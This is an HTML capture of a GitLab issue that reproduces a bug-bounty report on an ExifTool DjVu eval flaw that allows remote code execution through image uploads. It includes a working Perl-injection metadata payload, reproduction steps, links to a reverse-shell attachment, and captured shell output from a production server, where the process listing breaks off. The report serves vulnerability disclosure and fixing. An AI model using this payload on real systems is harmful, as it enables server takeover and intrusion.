id="user-content-what-is-the-expected-correct-behavior" class="anchor" href="#what-is-the-expected-correct-behavior" aria-hidden="true"></a>What is the expected <em data-sourcepos="342:29-342:37">correct</em> behavior?</h5>&#x000A;<ul data-sourcepos="343:1-346:0" dir="auto">&#x000A;<li data-sourcepos="343:1-343:77">There must be better ways of convert C escape sequences than using <code data-sourcepos="343:71-343:74">eval</code>&#x000A;</li>&#x000A;<li data-sourcepos="344:1-344:49">Only the TIFF and JPEG modules should be used</li>&#x000A;<li data-sourcepos="345:1-346:0">GitLab Workhorse could check if the file is a valid TIFF of JPEG before passing it to ExifTool</li>&#x000A;</ul>&#x000A;<h5 data-sourcepos="347:1-347:25" dir="auto">&#x000A;<a id="user-content-output-of-checks" class="anchor" href="#output-of-checks" aria-hidden="true"></a>Output of checks</h5>&#x000A;<p data-sourcepos="348:1-348:30" dir="auto">This bug happens on GitLab.com</p>&#x000A;<h6 data-sourcepos="350:1-350:44" dir="auto">&#x000A;<a id="user-content-results-of-gitlab-environment-info" class="anchor" href="#results-of-gitlab-environment-info" aria-hidden="true"></a>Results of GitLab environment info</h6>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="351:1-387:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">System information  </span>&#x000A;<span id="LC2" class="line" lang="plaintext">System:  </span>&#x000A;<span id="LC3" class="line" lang="plaintext">Proxy:		no  </span>&#x000A;<span id="LC4" class="line" lang="plaintext">Current User:	git  </span>&#x000A;<span id="LC5" class="line" lang="plaintext">Using RVM:	no  </span>&#x000A;<span id="LC6" class="line" lang="plaintext">Ruby Version:	2.7.2p137  </span>&#x000A;<span id="LC7" class="line" lang="plaintext">Gem Version:	3.1.4  </span>&#x000A;<span id="LC8" class="line" lang="plaintext">Bundler Version:2.1.4  </span>&#x000A;<span id="LC9" class="line" lang="plaintext">Rake Version:	13.0.3  </span>&#x000A;<span id="LC10" class="line" lang="plaintext">Redis Version:	6.0.10  </span>&#x000A;<span id="LC11" class="line" lang="plaintext">Git Version:	2.29.0  </span>&#x000A;<span id="LC12" class="line" lang="plaintext">Sidekiq Version:5.2.9  </span>&#x000A;<span id="LC13" class="line" lang="plaintext">Go Version:	unknown</span>&#x000A;<span id="LC14" class="line" lang="plaintext"></span>&#x000A;<span id="LC15" class="line" lang="plaintext">GitLab information  </span>&#x000A;<span id="LC16" class="line" lang="plaintext">Version:	13.10.2-ee  </span>&#x000A;<span id="LC17" class="line" lang="plaintext">Revision:	cc4224220e6  </span>&#x000A;<span id="LC18" class="line" lang="plaintext">Directory:	/opt/gitlab/embedded/service/gitlab-rails  </span>&#x000A;<span id="LC19" class="line" lang="plaintext">DB Adapter:	PostgreSQL  </span>&#x000A;<span id="LC20" class="line" lang="plaintext">DB Version:	12.6  </span>&#x000A;<span id="LC21" class="line" lang="plaintext">URL:		http://192.168.0.127:9080  </span>&#x000A;<span id="LC22" class="line" lang="plaintext">HTTP Clone URL:	http://192.168.0.127:9080/some-group/some-project.git  </span>&#x000A;<span id="LC23" class="line" lang="plaintext">SSH Clone URL:	git@192.168.0.127:some-group/some-project.git  </span>&#x000A;<span id="LC24" class="line" lang="plaintext">Elasticsearch:	no  </span>&#x000A;<span id="LC25" class="line" lang="plaintext">Geo:		no  </span>&#x000A;<span id="LC26" class="line" lang="plaintext">Using LDAP:	no  </span>&#x000A;<span id="LC27" class="line" lang="plaintext">Using Omniauth:	yes  </span>&#x000A;<span id="LC28" class="line" lang="plaintext">Omniauth Providers:</span>&#x000A;<span id="LC29" class="line" lang="plaintext"></span>&#x000A;<span id="LC30" class="line" lang="plaintext">GitLab Shell  </span>&#x000A;<span id="LC31" class="line" lang="plaintext">Version:	13.17.0  </span>&#x000A;<span id="LC32" class="line" lang="plaintext">Repository storage paths:  </span>&#x000A;<span id="LC33" class="line" lang="plaintext">- default: 	/var/opt/gitlab/git-data/repositories  </span>&#x000A;<span id="LC34" class="line" lang="plaintext">GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell  </span>&#x000A;<span id="LC35" class="line" lang="plaintext">Git:		/opt/gitlab/embedded/bin/git  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="389:1-389:12" dir="auto">&#x000A;<a id="user-content-impact-1" class="anchor" href="#impact-1" aria-hidden="true"></a>Impact</h4>&#x000A;<ul data-sourcepos="391:1-392:0" dir="auto">&#x000A;<li data-sourcepos="391:1-392:0">Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file</li>&#x000A;</ul>&#x000A;<h2 data-sourcepos="393:1-393:14" dir="auto">&#x000A;<a id="user-content-attachments" class="anchor" href="#attachments" aria-hidden="true"></a>Attachments</h2>&#x000A;<p data-sourcepos="395:1-395:77" dir="auto"><strong data-sourcepos="395:1-395:12">Warning:</strong> Attachments received through HackerOne, please exercise caution!</p>&#x000A;<ul data-sourcepos="397:1-399:0" dir="auto">&#x000A;<li data-sourcepos="397:1-397:107"><a data-sourcepos="397:3-397:107" href="https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip" rel="nofollow noreferrer noopener" target="_blank">echo_vakzz.jpg.zip</a></li>&#x000A;<li data-sourcepos="398:1-399:0"><a data-sourcepos="398:3-398:113" href="https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip" rel="nofollow noreferrer noopener" target="_blank">reverse_shell.jpg.zip</a></li>&#x000A;</ul>&#x000A;<h2 data-sourcepos="400:1-400:19" dir="auto">&#x000A;<a id="user-content-how-to-reproduce" class="anchor" href="#how-to-reproduce" aria-hidden="true"></a>How To Reproduce</h2>&#x000A;<p data-sourcepos="402:1-402:57" dir="auto">Please add <a data-sourcepos="402:12-402:40" href="https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues" rel="nofollow noreferrer noopener" target="_blank">reproducibility information</a> to this section:</p>&#x000A;<ol data-sourcepos="404:1-407:0" dir="auto">&#x000A;<li data-sourcepos="404:1-404:2">&#x000A;</li>&#x000A;<li data-sourcepos="405:1-405:2">&#x000A;</li>&#x000A;<li data-sourcepos="406:1-406:2">&#x000A;</li>&#x000A;</ol></div>
</div>

</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/278964/issues/327121/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="js-design-management" data-issue-iid="327121" data-issue-path="/gitlab-org/gitlab/-/issues/327121" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-project-path="gitlab-org/gitlab" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div class="js-work-item-links-root" data-full-path="gitlab-org/gitlab" data-issuable-id="84801598" data-issuable-iid="327121" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/gitlab-org/gitlab/-/issues/327121/links" data-full-path="gitlab-org/gitlab" data-has-issue-weights-feature="true" data-has-iterations-feature="true" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="true" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="false" data-iid="327121" data-project-path="gitlab-org/gitlab" id="js-related-merge-requests"></div>
<div data-url="/gitlab-org/gitlab/-/issues/327121/related_branches" id="related-branches">
</div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:84801598,&quot;iid&quot;:327121,&quot;description&quot;:&quot;**[HackerOne report #1154542](https://hackerone.com/reports/1154542)** by `vakzz` on 2021-04-07:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary  \nWhen uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104) through to [ExifTool](https://exiftool.org/) to remove any non-whitelisted tags.\n\nAn issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.\n\nOne of the supported formats is [DjVu](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm). When parsing the DjVu annotation, the [tokens are evaled](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233) to \&quot;convert C escape sequences\&quot;. \n\nThere is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:\n\n```  \n(metadata  \n\t(Copyright \&quot;\\  \n\&quot; . qx{echo vakzz \u003e/tmp/vakzz} . \\  \n\&quot; b \&quot;) )  \n```\n\n![echo_vakzz.jpg.zip](https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip) is an example DjVu file with the above metadata, and ![reverse_shell.jpg.zip](https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip) is an example that runs a reverse shell.\n\n#####  Steps to reproduce  \n1. Download ![echo_vakzz.jpg.zip](https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip) and unzip it  \n1. Create a new snippet  \n1. In the description field, hit \&quot;Attach a file\&quot;  \n1. Select and uplaod `echo_vakzz.jpg`  \n1. See that the file `/tmp/vakzz` has been created on the server\n\n\nUploading ![reverse_shell.jpg.zip](https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip) to https://gitlab.com/-/snippets/new resulted in a shell on `web-09-sv-gprd`:\n\n```  \nConnection from [34.74.90.73] port 12345 [tcp/*] accepted (family 2, sport 17073)  \nid  \nuid=500(git) gid=500(git) groups=500(git)  \nhostname -a  \nweb-09-sv-gprd  \nps auxww  \nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND  \nroot         1  0.0  0.0 185524  5496 ?        Ss    2020  28:31 /sbin/init  \nroot         2  0.0  0.0      0     0 ?        S     2020   1:44 [kthreadd]  \nroot         4  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/0:0H]  \nroot         6  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [mm_percpu_wq]  \nroot         7  0.0  0.0      0     0 ?        S     2020  22:50 [ksoftirqd/0]  \nroot         8  0.1  0.0      0     0 ?        I     2020 552:25 [rcu_sched]  \nroot         9  0.0  0.0      0     0 ?        I     2020   0:00 [rcu_bh]  \nroot        10  0.0  0.0      0     0 ?        S     2020   1:05 [migration/0]  \nroot        11  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/0]  \nroot        12  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/0]  \nroot        13  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/1]  \nroot        14  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/1]  \nroot        15  0.0  0.0      0     0 ?        S     2020   1:03 [migration/1]  \nroot        16  0.0  0.0      0     0 ?        S     2020  20:27 [ksoftirqd/1]  \nroot        18  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/1:0H]  \nroot        19  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/2]  \nroot        20  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/2]  \nroot        21  0.0  0.0      0     0 ?        S     2020   1:04 [migration/2]  \nroot        22  0.0  0.0      0     0 ?        S     2020  18:14 [ksoftirqd/2]  \nroot        24  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/2:0H]  \nroot        25  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/3]  \nroot        26  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/3]  \nroot        27  0.0  0.0      0     0 ?        S     2020   1:05 [migration/3]  \nroot        28  0.0  0.0      0     0 ?        S     2020  17:57 [ksoftirqd/3]  \nroot        30  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/3:0H]  \nroot        31  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/4]  \nroot        32  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/4]  \nroot        33  0.0  0.0      0     0 ?        S     2020   1:05 [migration/4]  \nroot        34  0.0  0.0      0     0 ?        S     2020  17:09 [ksoftirqd/4]  \nroot        36  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/4:0H]  \nroot        37  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/5]  \nroot        38  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/5]  \nroot        39  0.0  0.0      0     0 ?        S     2020   1:05 [migration/5]  \nroot        40  0.0  0.0      0     0 ?        S     2020  16:56 [ksoftirqd/5]  \nroot        42  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/5:0H]  \nroot        43  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/6]  \nroot        44  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/6]  \nroot        45  0.0  0.0      0     0 ?        S     2020   1:05 [migration/6]  \nroot        46  0.0  0.0      0     0 ?        S     2020  16:33 [ksoftirqd/6]  \nroot        48  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/6:0H]  \nroot        49  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/7]  \nroot        50  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/7]  \nroot        51  0.0  0.0      0     0 ?        S     2020   1:05 [migration/7]  \nroot        52  0.0  0.0      0     0 ?        S     2020  16:25 [ksoftirqd/7]  \nroot        54  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/7:0H]  \nroot        55  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/8]  \nroot        56  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/8]  \nroot        57  0.0  0.0      0     0 ?        S     2020   1:06 [migration/8]  \nroot        58  0.0  0.0      0     0 ?        S     2020  16:22 [ksoftirqd/8]  \nroot        60  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/8:0H]  \nroot        61  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/9]  \nroot        62  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/9]  \nroot        63  0.0  0.0      0     0 ?        S     2020   1:05 [migration/9]  \nroot        64  0.0  0.0      0     0 ?        S     2020  15:52 [ksoftirqd/9]  \nroot        66  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/9:0H]  \nroot        67  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/10]  \nroot        68  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/10]  \nroot        69  0.0  0.0      0     0 ?        S     2020   1:06 [migration/10]  \nroot        70  0.0  0.0      0     0 ?        S     2020  16:10 [ksoftirqd/10]  \nroot        72  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/10:0H]  \nroot        73  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/11]  \nroot        74  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/11]  \nroot        75  0.0  0.0      0     0 ?        S     2020   1:06 [migration/11]  \nroot        76  0.0  0.0      0     0 ?        S     2020  16:08 [ksoftirqd/11]  \nroot        78  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/11:0H]  \nroot        79  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/12]  \nroot        80  0.0  0.0      0     0 ?        S     2020   1:09 [watchdog/12]  \nroot        81  0.0  0.0      0     0 ?        S     2020   1:03 [migration/12]  \nroot        82  0.0  0.0      0     0 ?        S     2020  17:07 [ksoftirqd/12]  \nroot        84  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/12:0H]  \nroot        85  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/13]  \nroot        86  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/13]  \nroot        87  0.0  0.0      0     0 ?        S     2020   1:06 [migration/13]  \nroot        88  0.0  0.0      0     0 ?        S     2020  16:45 [ksoftirqd/13]  \nroot        90  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/13:0H]  \nroot        91  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/14]  \nroot        92  0.0  0.0      0     0 ?        S     2020   1:04 [watchdog/14]  \nroot        93  0.0  0.0      0     0 ?        S     2020   1:05 [migration/14]  \nroot        94  0.0  0.0      0     0 ?        S     2020  16:27 [ksoftirqd/14]  \nroot        96  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/14:0H]  \nroot        97  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/15]  \nroot        98  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/15]  \nroot        99  0.0  0.0      0     0 ?        S     2020   1:07 [migration/15]  \nroot       100  0.0  0.0      0     0 ?        S     2020  16:35 [ksoftirqd/15]  \nroot       102  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/15:0H]  \nroot       103  0.0  0.0      0     0 ?        S     2020   0:00 [kdevtmpfs]  \nroot       104  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [netns]  \nroot       105  0.0  0.0      0     0 ?        S     2020   0:00 [rcu_tasks_kthre]  \nroot       106  0.0  0.0      0     0 ?        S     2020   0:00 [kauditd]  \nroot       110  0.0  0.0      0     0 ?        S     2020   0:33 [khungtaskd]  \nroot       111  0.0  0.0      0     0 ?        S     2020   0:11 [oom_reaper]  \nroot       112  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [writeback]  \nroot       113  0.0  0.0      0     0 ?        S     2020   0:51 [kcompactd0]  \nroot       114  0.0  0.0      0     0 ?        SN    2020   0:00 [ksmd]  \nroot       115  0.0  0.0      0     0 ?        SN    2020   3:10 [khugepaged]  \nroot       116  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [crypto]  \nroot       117  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kintegrityd]  \nroot       118  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kblockd]  \nroot       119  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ata_sff]  \nroot       120  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [md]  \nroot       121  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [edac-poller]  \nroot       122  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [devfreq_wq]  \nroot       123  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [watchdogd]  \nroot       127  0.0  0.0      0     0 ?        S     2020  76:51 [kswapd0]  \nroot       128  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/u33:0]  \nroot       129  0.0  0.0      0     0 ?        S     2020   0:00 [ecryptfs-kthrea]  \nroot       172  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kthrotld]  \nroot       173  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [acpi_thermal_pm]  \nroot       174  0.0  0.0      0     0 ?        S     2020   0:00 [scsi_eh_0]  \nroot       175  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [scsi_tmf_0]  \nroot       183  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ipv6_addrconf]  \nroot       195  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kstrp]  \nroot       212  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [charger_manager]  \nroot       406  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [raid5wq]  \nroot       454  0.0  0.0      0     0 ?        S     2020  10:42 [jbd2/sda1-8]  \nroot       455  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ext4-rsv-conver]  \nroot       515  0.0  0.0      0     0 ?        I\u003c    2020  11:09 [kworker/12:1H]  \nroot       522  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [iscsi_eh]  \nroot       525  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ib-comp-wq]  \nroot       526  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ib-comp-unb-wq]  \nroot       527  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ib_mcast]  \nroot       528  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ib_nl_sa_wq]  \nroot       531  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [rdma_cm]  \nroot       542  0.0  0.0      0     0 ?        I\u003c    2020  10:56 [kworker/6:1H]  \nroot       549  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [rpciod]  \nroot       550  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [xprtiod]  \nroot       565  0.0  0.0 102968   824 ?        Ss    2020   0:00 /sbin/lvmetad -f  \nroot       595  0.0  0.0  42604  3368 ?        Ss    2020   2:12 /lib/systemd/systemd-udevd  \nroot       596  0.0  0.0  12204  4680 ?        Ss    2020 451:18 /usr/sbin/haveged --Foreground --verbose=1 -w 1024  \nroot       597  0.0  0.0  97900 38924 ?        Ss    2020 113:30 /lib/systemd/systemd-journald  \nroot       763  0.0  0.0      0     0 ?        S     2020   0:00 [hwrng]  \nroot       798  0.0  0.0      0     0 ?        I\u003c    2020   1:33 [kworker/13:1H]  \nroot       814  0.0  0.0      0     0 ?        S     2020  12:32 [jbd2/sdb-8]  \nroot       815  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ext4-rsv-conver]  \nprometh+   969  0.6  0.0 720896 31292 ?        Sl    2020 1997:39 /opt/prometheus/node_exporter/node_exporter --web.listen-address=:9100 --collector.mountstats --collector.nfs --collector.ntp --collector.textfile.directory=/opt/prometheus/node_exporter/metrics --collector.filesystem.ignored-fs-types=^(autofs|binfmt_misc|bpf|cgroup2?|configfs|debugfs|devpts|devtmpfs|fusectl|hugetlbfs|iso9660|mqueue|nfs.*|nsfs|overlay|proc|procfs|pstore|rpc_pipefs|securityfs|selinuxfs|squashfs|sysfs|tracefs)$ --collector.netstat.fields=^(.*_(InErrors|InErrs)|Ip_Forwarding|Ip(6|Ext)_(InOctets|OutOctets)|Icmp6?_(InMsgs|OutMsgs)|TcpExt_(Listen.*|Syncookies.*|TCPSynRetrans)|Tcp_(ActiveOpens|InSegs|OutSegs|OutRsts|PassiveOpens|RetransSegs|CurrEstab)|Udp6?_(InDatagrams|OutDatagrams|NoPorts|RcvbufErrors|SndbufErrors))$  \nroot      1224  0.0  0.0      0     0 ?        I\u003c    2020   1:36 [kworker/10:1H]  \nroot      1230  0.0  0.0  16124  2920 ?        Ss    2020   0:01 /sbin/dhclient -1 -v -pf /run/dhclient.ens4.pid -lf /var/lib/dhcp/dhclient.ens4.leases -I -df /var/lib/dhcp/dhclient6.ens4.leases ens4  \nroot      1386  0.0  0.0   5220   112 ?        Ss    2020   6:09 /sbin/iscsid  \nroot      1389  0.0  0.0   5720  3512 ?        S\u003cLs  2020  29:44 /sbin/iscsid  \nroot      1407  0.0  0.0 382660   408 ?        Ssl   2020   3:07 /usr/bin/lxcfs /var/lib/lxcfs/  \nroot      1426  0.0  0.0  27728  2320 ?        Ss    2020   3:41 /usr/sbin/cron -f  \nsyslog    1446  0.0  0.0 256392  2112 ?        Ssl   2020  56:37 /usr/sbin/rsyslogd -n  \nroot      1476  0.0  0.0  28628  2648 ?        Ss    2020   0:51 /lib/systemd/systemd-logind  \nroot      1512  0.0  0.0   4396  1208 ?        Ss    2020   0:00 /usr/sbin/acpid  \ndaemon    1525  0.0  0.0  26044  1464 ?        Ss    2020   0:00 /usr/sbin/atd -f  \npostfix   1570  0.0  0.0  67476  4488 ?        S    12:40   0:00 pickup -l -t fifo -u  \nroot      1593  0.0  0.0   4392   904 ?        Ss    2020   7:41 runsvdir -P /etc/service log: /process HTTP/1.1\&quot; 200 153 - -\u003e /process 10.219.1.10 - - [07/Apr/2021:13:13:54 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u003e /process 10.219.1.9 - - [07/Apr/2021:13:13:58 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u003e /process 10.219.1.10 - - [07/Apr/2021:13:14:09 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u003e /process 10.219.1.9 - - [07/Apr/2021:13:14:13 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u003e /process  \ngit       1594 50.1  2.0 2843912 1351680 ?     Sl   12:40  17:00 puma: cluster worker 0: 7369 [gitlab-puma-worker]  \nmessage+  1599  0.0  0.0  43028  3356 ?        Ss    2020   1:36 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation  \nroot      1615  0.0  0.0   4240  1200 ?        Ss    2020   0:26 runsv apt_metrics  \nroot      1617  0.0  0.0   4240  1104 ?        Ss    2020   0:03 runsv node_exporter  \nroot      1618  0.0  0.0   4240  1104 ?        Ss    2020   4:24 runsv ntpd_metrics  \nroot      1620  0.0  0.0   4240   380 ?        Ss    2020   0:00 runsv gitlab-monitor  \nroot      1621  0.0  0.0   4240   388 ?        Ss    2020   0:00 runsv mtail  \nroot      1623  0.0  0.0      0     0 ?        I\u003c    2020  15:18 [kworker/0:1H]  \nroot      1624  0.0  0.0   4384   252 ?        S     2020   0:04 svlogd -tt /var/log/mtail  \nroot      1625  0.0  0.0   4384   380 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_apt_metrics  \nroot      1626  0.0  0.0   4384   224 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_ntpd_metrics  \nroot      1627  0.0  0.0   4384   236 ?        S     2020   0:02 svlogd -tt /var/log/prometheus/node_exporter  \nroot      1628  0.0  0.0   4384   240 ?        S     2020   0:00 svlogd -tt /var/log/gitlab-monitor  \nroot      1713  0.0  0.0  13372   908 ?        Ss    2020   0:02 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog  \nroot      1716  0.0  0.0      0     0 ?        I\u003c    2020   0:46 [kworker/14:1H]  \nroot      1844  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [nfsiod]  \nroot      1850  0.0  0.0 277088  2224 ?        Ssl   2020   0:36 /usr/lib/policykit-1/polkitd --no-debug  \nroot      1878  0.0  0.0      0     0 ?        I\u003c    2020   5:54 [kworker/2:1H]  